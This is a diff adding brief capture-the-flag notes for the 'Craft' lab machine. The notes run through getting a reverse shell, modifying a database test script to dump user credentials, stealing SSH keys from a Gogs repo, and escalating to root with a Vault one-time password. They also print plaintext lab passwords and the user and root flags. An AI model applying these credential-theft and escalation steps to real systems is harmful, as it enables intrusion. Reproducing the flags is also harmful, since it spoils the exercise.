@@ -1,0 +1,41 @@
+add api.craft.htb and gogs.craft.htb to hosts file to craft's ip
+
+run exploit.sh with your ip and port for reverse shell
+
+modify dbtest.py:
+    sq = "SELECT * FROM user"
+and:
+    result = cursor.fetchmany(10)
+
+./dbtest.py
+
+gets creds:
+dinesh:4aUh0A8PbVJxgd
+ebachman:llJ77D8QFkLPQB
+gilfoyle:ZEU3N8WNM2rh4T
+
+log into gogs git as gilfoyle
+go to gilfoyle's private repo
+steal contents of .ssh
+
+make keys proper permissions:
+chmod 600 id_rsa*
+ssh -i ssh/id_rsa gilfoyle@craft.htb
+ZEU3N8WNM2rh4T
+
+user'd
+
+create a one time pass for root
+vault write ssh/creds/root_otp ip=127.0.0.1
+
+save the key value
+
+login to the server as root using the one time pass as password:
+vault ssh -role root_otp -mode otp -strict-host-key-checking=no root@127.0.0.1
+6f6913b8-f8ff-a0c4-7f3a-4c02321090f9
+
+root'd
+
+user:bbf4b0cadfa3d4e6d0914c9cd5a612d4
+root:831d64ef54d92c1af795daae28a11591
+
